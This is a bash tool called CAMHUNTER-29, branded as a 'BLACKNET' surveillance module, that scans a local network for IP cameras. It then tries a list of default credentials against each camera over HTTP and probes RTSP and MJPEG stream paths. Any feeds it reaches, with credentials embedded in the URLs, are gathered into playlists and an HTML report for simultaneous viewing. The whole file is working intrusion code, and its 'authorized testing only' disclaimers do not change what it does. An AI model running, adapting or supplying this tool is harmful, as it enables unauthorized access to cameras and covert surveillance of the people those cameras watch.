#!/bin/bash
clear

RED="\033[38;5;196m"      
GREEN="\033[38;5;46m"
BLUE="\033[38;5;39m"      
PURPLE="\033[38;5;129m"   
WHITE="\033[97m"          
GRAY="\033[38;5;240m"     
CYAN="\033[38;5;51m"      
YELLOW="\033[38;5;226m"   
NC="\033[0m"              

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE" 2>/dev/null
}

print_banner() {
    echo -e "${GREEN}"
    echo "       ██████╗ ██╗      █████╗  ██████╗██╗  ██╗███╗   ██╗███████╗████████╗"
    echo "       ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝████╗  ██║██╔════╝╚══██╔══╝"
    echo "       ██████╔╝██║     ███████║██║     █████╔╝ ██╔██╗ ██║█████╗     ██║   "
    echo "       ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║╚██╗██║██╔══╝     ██║   "
    echo "       ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║ ╚████║███████╗   ██║   "
    echo "       ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   "
    echo -e "${NC}"
    echo -e "${RED} ██████╗ █████╗ ███╗   ███╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ${NC}"
    echo -e "${RED}██╔════╝██╔══██╗████╗ ████║██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗${NC}"
    echo -e "${RED}██║     ███████║██╔████╔██║███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝${NC}"
    echo -e "${RED}██║     ██╔══██║██║╚██╔╝██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗${NC}"
    echo -e "${RED}╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║${NC}"
    echo -e "${RED} ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝${NC}"
    echo -e "${WHITE} [ By: Mr. RedRaccoon ]   [ CAMHUNTER-29 v1.0 ]   [ Released on: 1/30/2026 ]${NC}"
    echo -e "${GRAY}══════════════════════════════════════════════════════════════════════════${NC}"
}

print_banner

echo -e "${WHITE} [ TOOL    : ${GREEN}CAMHUNTER-29 v1.0${WHITE} ]${NC}"
echo -e "${WHITE} [ TEAM    : ${PURPLE}BLACKNET${WHITE} ]${NC}"
echo -e "${WHITE} [ BY      : ${CYAN}Mr. RedRaccoon${WHITE} ]${NC}"
echo -e "${WHITE} [ STATUS  : ${RED}ACTIVE${WHITE} ]${NC}"

echo -e "${GRAY}──────────────────────────────────────────────────────────────────────────${NC}"
echo -e "${GREEN} >> Reconnaissance | Surveillance | Data Capture | Intelligence Module${NC}"
echo -e "${GRAY}──────────────────────────────────────────────────────────────────────────${NC}"

echo -ne "${CYAN}Initializing BLACKNET core"
for i in {1..3}; do sleep 0.3; echo -ne "."; done
echo -e ".${NC}"

echo -e "${GREEN}[■■■■■■■■■■----------] 50%${NC}"
sleep 0.3
echo -e "${GREEN}[■■■■■■■■■■■■■■■■----] 80%${NC}"
sleep 0.3
echo -e "${GREEN}[■■■■■■■■■■■■■■■■■■■■] 100%${NC}"

echo -e "${GRAY}──────────────────────────────────────────────────────────────────────────${NC}"

echo -e "${BLUE}[LOG] Establishing secure tunnel...${NC}"
sleep 0.2
echo -e "${BLUE}[LOG] Loading reconnaissance modules...${NC}"
sleep 0.2
echo -e "${BLUE}[LOG] Verifying network integrity...${NC}"
sleep 0.2
echo -e "${GREEN}[LOG] BLACKNET protocol online.${NC}"

echo -e "${GRAY}──────────────────────────────────────────────────────────────────────────${NC}"

echo -e "${PURPLE}[ SYSTEM INFO ]${NC}"
echo -e "${CYAN} User   : $(whoami)${NC}"
echo -e "${CYAN} Host   : $(hostname)${NC}"
echo -e "${CYAN} Kernel : $(uname -r)${NC}"
echo -e "${CYAN} OS     : $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '"' || echo "Unknown")${NC}"
echo -e "${CYAN} IP     : $(ip route get 1 2>/dev/null | awk '{print $7}' | head -1 || echo "N/A")${NC}"

echo -e "${GRAY}══════════════════════════════════════════════════════════════════════════${NC}"
echo ""

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root${NC}"
   exit 1
fi

BASE_DIR="/tmp/camhunter_$(date +%s)"
RESULTS_DIR="$BASE_DIR/results"
STREAMS_DIR="$BASE_DIR/streams"
LOG_DIR="$BASE_DIR/logs"

mkdir -p "$RESULTS_DIR" "$STREAMS_DIR" "$LOG_DIR"
LOG_FILE="$LOG_DIR/scan_$(date +%Y%m%d_%H%M%S).log"
HTML_REPORT="$STREAMS_DIR/camera_report.html"

log "=== CAMHUNTER-29 INITIATED ==="
log "Starting comprehensive IoT camera security assessment"

CREDENTIALS=(
    "admin:admin"
    "admin:12345"
    "admin:123456"
    "admin:password"
    "admin:"
    "root:root"
    "root:12345"
    "root:admin"
    "admin:admin123"
    "supervisor:supervisor"
    "guest:guest"
    "user:user"
    "service:service"
    "888888:888888"
    "666666:666666"
)

RTSP_PATHS=(
    "/11"
    "/12"
    "/live.sdp"
    "/stream1"
    "/stream2"
    "/ch0_0.h264"
    "/ch0_1.h264"
    "/main"
    "/video"
    "/h264"
    "/av0_0"
    "/av0_1"
    "/cam/realmonitor"
    "/user=admin_password=admin_channel=1_stream=0.sdp"
    "/user=admin_password=12345_channel=1_stream=0.sdp"
    "/live/ch0_0"
)

CAMERA_VENDORS=("44:AB:FD" "88:CE:FA" "C8:85:50" "9C:8E:99" "A4:17:31" "94:B8:6D" "D4:63:C6" "B8:78:2E")

log "PHASE 1: Network Discovery"

INTERFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
if [ -z "$INTERFACE" ] || [ ! -d "/sys/class/net/$INTERFACE" ]; then
    INTERFACE=$(ls /sys/class/net | grep -E '^(eth|enp|wlan|wlp)' | head -1)
    if [ -z "$INTERFACE" ]; then
        INTERFACE="eth0"
    fi
fi
log "Using interface: $INTERFACE"

NETWORK=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -1)
if [ -z "$NETWORK" ]; then
    echo -e "${YELLOW}[WARNING] Could not detect network.${NC}"
    read -p "Enter network (e.g., 192.168.1.0/24): " NETWORK
    if [ -z "$NETWORK" ]; then
        echo -e "${RED}[ERROR] No network specified. Exiting.${NC}"
        exit 1
    fi
fi

log "Scanning network: $NETWORK"

echo -e "${CYAN}[*] Discovering devices on network...${NC}"
arp-scan --localnet --interface="$INTERFACE" > "$RESULTS_DIR/arp_scan.txt" 2>&1

IPS=$(grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' "$RESULTS_DIR/arp_scan.txt" | grep -v '^0\.0\.0\.0$' | sort -u)

if [ -z "$IPS" ]; then
    log "[WARNING] No IPs found via ARP. Using nmap ping sweep..."
    nmap -sn "$NETWORK" -oG "$RESULTS_DIR/nmap_ping.txt" >/dev/null 2>&1
    IPS=$(grep "Status: Up" "$RESULTS_DIR/nmap_ping.txt" | awk '{print $2}' | sort -u)
fi

IP_COUNT=$(echo "$IPS" | wc -w 2>/dev/null || echo "0")
log "Found $IP_COUNT active IP addresses"

log "PHASE 2: Camera Identification"

CAMERA_IPS="$RESULTS_DIR/camera_ips.txt"
echo -n > "$CAMERA_IPS"

counter=0
if [ -n "$IPS" ]; then
    for IP in $IPS; do
        [[ "$IP" == *".0" ]] || [[ "$IP" == *".255" ]] || [[ "$IP" == *".1" ]] && continue
        
        log "Probing $IP..."
        
        timeout 2 bash -c "echo > /dev/tcp/$IP/80" 2>/dev/null && PORT80=0 || PORT80=1
        timeout 2 bash -c "echo > /dev/tcp/$IP/554" 2>/dev/null && PORT554=0 || PORT554=1
        timeout 2 bash -c "echo > /dev/tcp/$IP/37777" 2>/dev/null && PORT37777=0 || PORT37777=1
        
        CAMERA_DETECTED=false
        
        if [ $PORT80 -eq 0 ]; then
            HEADERS=$(timeout 5 curl -s -I "http://$IP" 2>/dev/null)
            if echo "$HEADERS" | grep -i "camera\|ipcam\|webcam\|dvr\|nvr\|surveillance" >/dev/null; then
                CAMERA_DETECTED=true
            else
                TITLE=$(timeout 5 curl -s "http://$IP" | grep -i '<title>' | head -1)
                if echo "$TITLE" | grep -i "camera\|ipcam\|webcam\|login\|admin\|security" >/dev/null; then
                    CAMERA_DETECTED=true
                fi
            fi
        fi
        
        [ $PORT554 -eq 0 ] && CAMERA_DETECTED=true
        [ $PORT37777 -eq 0 ] && CAMERA_DETECTED=true
        
        MAC=$(grep "$IP" "$RESULTS_DIR/arp_scan.txt" | awk '{print $2}' | head -1)
        for VENDOR in "${CAMERA_VENDORS[@]}"; do
            [[ $MAC == "$VENDOR"* ]] && CAMERA_DETECTED=true
        done
        
        if [ "$CAMERA_DETECTED" = true ]; then
            echo "$IP" >> "$CAMERA_IPS"
            ((counter++))
            log "  [CAMERA DETECTED] $IP"
        fi
    done
fi

log "Identified $counter potential cameras"

log "PHASE 3: Vulnerability Assessment"

if ! command -v ffprobe &>/dev/null; then
    log "[WARNING] ffprobe not found. Installing ffmpeg..."
    apt-get update && apt-get install -y ffmpeg 2>/dev/null || \
    echo -e "${YELLOW}[!] Install ffmpeg manually for RTSP testing${NC}"
fi

CAMERA_COUNT=0
VULNERABLE_CAMERAS=0
HTML_CARDS=""

if [ -s "$CAMERA_IPS" ]; then
    while IFS= read -r CAMERA_IP || [ -n "$CAMERA_IP" ]; do
        ((CAMERA_COUNT++))
        log "Scanning camera: $CAMERA_IP"
        
        CAM_DIR="$RESULTS_DIR/camera_$CAMERA_IP"
        mkdir -p "$CAM_DIR"
        
        VULN_FOUND=false
        STREAM_LINKS=""
        OPEN_PORTS=""
        HTTP_AUTH=""
        CRED_FOUND=""
        
        timeout 30 nmap -T4 -p 21,22,23,80,81,82,83,443,554,8000,8080,8081,8443,9000,37777,37778 "$CAMERA_IP" -oN "$CAM_DIR/quick_ports.txt" >/dev/null 2>&1
        OPEN_PORTS=$(grep -E '^[0-9]+/tcp.*open' "$CAM_DIR/quick_ports.txt" | awk -F'/' '{print $1}' | tr '\n' ' ')
        
        for CRED in "${CREDENTIALS[@]}"; do
            USER="${CRED%%:*}"
            PASS="${CRED##*:}"
            
            RESPONSE=$(timeout 8 curl -s -o /dev/null -w "%{http_code}" "http://$CAMERA_IP/" --user "$USER:$PASS" 2>/dev/null)
            
            if [ "$RESPONSE" = "200" ] || [ "$RESPONSE" = "401" ]; then
                TEST=$(timeout 8 curl -s "http://$CAMERA_IP/cgi-bin/status" --user "$USER:$PASS" 2>/dev/null | head -c 50)
                if [ -n "$TEST" ] && [[ ! "$TEST" =~ "Unauthorized" ]]; then
                    CRED_FOUND="$USER:$PASS"
                    HTTP_AUTH="$USER:$PASS"
                    VULN_FOUND=true
                    log "  [CREDS] Found: $CRED_FOUND"
                    break
                fi
            fi
        done
        
        for RTPATH in "${RTSP_PATHS[@]}"; do
            timeout 4 ffprobe -loglevel error "rtsp://$CAMERA_IP$RTPATH" >/dev/null 2>&1
            if [ $? -eq 0 ]; then
                STREAM_LINKS+="rtsp://$CAMERA_IP$RTPATH\n"
                VULN_FOUND=true
                log "  [RTSP] Open stream: rtsp://$CAMERA_IP$RTPATH"
            fi
            
            if [ -n "$HTTP_AUTH" ]; then
                USER="${HTTP_AUTH%%:*}"
                PASS="${HTTP_AUTH##*:}"
                timeout 4 ffprobe -loglevel error "rtsp://$USER:$PASS@$CAMERA_IP$RTPATH" >/dev/null 2>&1
                if [ $? -eq 0 ]; then
                    STREAM_LINKS+="rtsp://$USER:$PASS@$CAMERA_IP$RTPATH\n"
                    log "  [RTSP] Authenticated stream found"
                fi
            fi
        done
        
        HTTP_PATHS=("/video.mjpg" "/mjpg/video.mjpg" "/img/video.mjpeg" "/stream" "/live" "/snapshot.jpg" "/videostream.cgi")
        for HPATH in "${HTTP_PATHS[@]}"; do
            if [ -n "$HTTP_AUTH" ]; then
                CODE=$(timeout 5 curl -s -o /dev/null -w "%{http_code}" "http://$HTTP_AUTH@$CAMERA_IP$HPATH" 2>/dev/null)
                [ "$CODE" = "200" ] && STREAM_LINKS+="http://$HTTP_AUTH@$CAMERA_IP$HPATH\n"
            else
                CODE=$(timeout 5 curl -s -o /dev/null -w "%{http_code}" "http://$CAMERA_IP$HPATH" 2>/dev/null)
                [ "$CODE" = "200" ] && STREAM_LINKS+="http://$CAMERA_IP$HPATH\n"
            fi
        done
        
        [ "$VULN_FOUND" = true ] && ((VULNERABLE_CAMERAS++))
        
        if [ -n "$STREAM_LINKS" ]; then
            PLAYLIST="$STREAMS_DIR/camera_${CAMERA_IP}.m3u"
            echo "#EXTM3U" > "$PLAYLIST"
            echo "$STREAM_LINKS" | while IFS= read -r LINK; do
                [ -n "$LINK" ] && echo -e "#EXTINF:-1,Camera $CAMERA_IP\n$LINK" >> "$PLAYLIST"
            done
        fi
        
    done < "$CAMERA_IPS"
fi

log "PHASE 4: Generating Final Report"

SCAN_MINUTES=$((SECONDS / 60))
SCAN_SECONDS=$((SECONDS % 60))

cat > "$HTML_REPORT" <<EOF
<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<title>CAMHUNTER-29 | Security Scan Report</title>
<style>
* {
    box-sizing: border-box;
}
body {
    background: #070b10;
    color: #cbd5e1;
    font-family: Consolas, Monaco, monospace;
    margin: 0;
    padding: 0;
}
.container {
    max-width: 1100px;
    margin: 40px auto;
    padding: 30px;
    background: #0d1117;
    border: 1px solid #1f2937;
    border-radius: 8px;
    box-shadow: 0 0 20px rgba(0,0,0,0.6);
}
h1 {
    color: #22d3ee;
    font-size: 26px;
    margin-bottom: 10px;
}
h2 {
    color: #38bdf8;
    margin-top: 30px;
    border-bottom: 1px solid #1f2937;
    padding-bottom: 6px;
}
p {
    font-size: 14px;
    line-height: 1.6;
}
.stats {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 15px;
    margin-top: 15px;
}
.stat-box {
    background: #020617;
    border: 1px solid #1f2937;
    padding: 15px;
    border-radius: 6px;
}
.stat-title {
    color: #94a3b8;
    font-size: 12px;
}
.stat-value {
    font-size: 20px;
    color: #22c55e;
}
ul {
    margin-top: 10px;
}
li {
    margin: 6px 0;
}
a {
    color: #22c55e;
    text-decoration: none;
}
a:hover {
    text-decoration: underline;
}
.footer {
    margin-top: 40px;
    font-size: 12px;
    color: #64748b;
    border-top: 1px solid #1f2937;
    padding-top: 12px;
}
.warning {
    margin-top: 20px;
    padding: 12px;
    background: #020617;
    border-left: 3px solid #ef4444;
    color: #e5e7eb;
    font-size: 13px;
}
</style>
</head>
<body>
<div class='container'>

<h1>CAMHUNTER-29: Security Scan Report</h1>
<p>BLACKNET Framework — Network Camera Reconnaissance Module</p>

<h2>Scan Summary</h2>
<div class='stats'>
    <div class='stat-box'>
        <div class='stat-title'>Total Devices Detected</div>
        <div class='stat-value'>$CAMERA_COUNT</div>
    </div>
    <div class='stat-box'>
        <div class='stat-title'>Potentially Vulnerable Devices</div>
        <div class='stat-value'>$VULNERABLE_CAMERAS</div>
    </div>
    <div class='stat-box'>
        <div class='stat-title'>Scan Duration</div>
        <div class='stat-value'>${SCAN_MINUTES}m ${SCAN_SECONDS}s</div>
    </div>
</div>

EOF

for PL in "$STREAMS_DIR"/*.m3u; do
    if [ -f "$PL" ]; then
        CAM_IP=$(basename "$PL" | sed 's/camera_//' | sed 's/.m3u//')
        echo "<li><a href='file://$PL'>Camera Stream - $CAM_IP</a></li>" >> "$HTML_REPORT"
    fi
done

cat >> "$HTML_REPORT" <<EOF
</ul>

<h2>Operational Notes</h2>
<p>
Streams can be accessed using compatible media players such as VLC or RTSP-capable clients.
Playlist files (.m3u) allow simultaneous monitoring of multiple devices.
</p>

<div class='warning'>
WARNING: This report is generated for authorized security testing and research purposes only.
Unauthorized access to devices or networks may violate applicable laws and regulations.
</div>

<div class='footer'>
<p>BLACKNET Operative ID</p>
</div>

</div>
</body>
</html>
EOF

log "Report generated: $HTML_REPORT"

echo ""
echo -e "${GREEN}══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                        SCAN RESULTS${NC}"
echo -e "${GREEN}══════════════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${CYAN}  • Network Scanned    : ${WHITE}$NETWORK${NC}"
echo -e "${CYAN}  • Total Cameras      : ${WHITE}$CAMERA_COUNT${NC}"
echo -e "${CYAN}  • Vulnerable Devices : ${RED}$VULNERABLE_CAMERAS${NC}"
echo -e "${CYAN}  • Scan Duration      : ${WHITE}${SCAN_MINUTES}m ${SCAN_SECONDS}s${NC}"
echo -e "${CYAN}  • Report File        : ${WHITE}$HTML_REPORT${NC}"
echo ""
echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}                     DIRECT ACCESS LINKS${NC}"
echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${WHITE}Copy and paste these links into your browser:${NC}"
echo ""
echo -e "${GREEN}file://$HTML_REPORT${NC}"
echo ""

if [ $CAMERA_COUNT -gt 0 ]; then
    FIRST_M3U=$(ls "$STREAMS_DIR"/*.m3u 2>/dev/null | head -1)
    if [ -n "$FIRST_M3U" ]; then
        echo -e "${GREEN}file://$FIRST_M3U${NC}"
        echo ""
    fi
fi

echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}                     LEGAL DISCLAIMER${NC}"
echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${WHITE}This tool is for authorized security testing only.${NC}"
echo -e "${WHITE}Unauthorized access to networks or devices is illegal.${NC}"
echo -e "${WHITE}Use only on networks you own or have explicit permission to test.${NC}"
echo ""

echo -e "${CYAN}Would you like to open the report in your web browser? (y/n)${NC}"
read -p "" OPEN_CHOICE

if [[ "$OPEN_CHOICE" =~ ^[Yy][Ee][Ss]$|^[Yy]$ ]]; then
    echo -e "${GREEN}[*] Attempting to open report in browser...${NC}"
    
    if command -v xdg-open >/dev/null 2>&1; then
        xdg-open "$HTML_REPORT" 2>/dev/null &
        sleep 1
        echo -e "${GREEN}[✓] Report should open in your default browser.${NC}"
    elif command -v sensible-browser >/dev/null 2>&1; then
        sensible-browser "$HTML_REPORT" 2>/dev/null &
        sleep 1
        echo -e "${GREEN}[✓] Report opened successfully.${NC}"
    elif command -v firefox >/dev/null 2>&1; then
        firefox "$HTML_REPORT" 2>/dev/null &
        sleep 1
        echo -e "${GREEN}[✓] Report opened in Firefox.${NC}"
    elif command -v chrome >/dev/null 2>&1; then
        chrome "$HTML_REPORT" 2>/dev/null &
        sleep 1
        echo -e "${GREEN}[✓] Report opened in Chrome.${NC}"
    else
        echo -e "${YELLOW}[!] Could not detect a browser.${NC}"
        echo ""
        echo -e "${WHITE}Please open this link manually in your browser:${NC}"
        echo -e "${GREEN}file://$HTML_REPORT${NC}"
        echo ""
        echo -e "${WHITE}Or use one of these commands:${NC}"
        echo -e "${GRAY}xdg-open \"$HTML_REPORT\"${NC}"
        echo -e "${GRAY}firefox \"$HTML_REPORT\"${NC}"
    fi
else
    echo -e "${GRAY}[*] Report will not be opened automatically.${NC}"
    echo ""
    echo -e "${WHITE}To view the report later, use:${NC}"
    echo -e "${GREEN}file://$HTML_REPORT${NC}"
fi

echo ""
echo -e "${GRAY}══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${WHITE}Temporary files location:${NC}"
echo -e "${RED}  $BASE_DIR${NC}"
echo -e "${WHITE}To clean up:${NC}"
echo -e "${RED}  rm -rf $BASE_DIR${NC}"
echo -e "${GRAY}══════════════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${GREEN}[✓] CAMHUNTER-29 mission complete.${NC}"
echo ""
